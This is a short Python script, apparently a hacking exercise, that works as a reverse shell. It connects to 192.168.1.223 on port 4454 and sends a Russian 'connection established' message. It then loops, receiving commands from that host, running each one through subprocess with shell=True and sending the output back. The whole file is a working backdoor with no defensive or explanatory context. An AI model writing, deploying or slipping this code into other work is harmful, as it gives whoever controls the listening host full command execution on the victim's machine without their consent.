import socket
import subprocess

def execute_system_command(command):
	return subprocess.check_output(command, shell = True)
	
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.1.223", 4454))

message = "\nСоединение установлено.\n"
connection.send(message.encode('utf-8'))

while True:
	command = connection.recv(1024)
	command_result = execute_system_command(command.decode('utf-8'))
	connection.send(command_result)
connection.close()

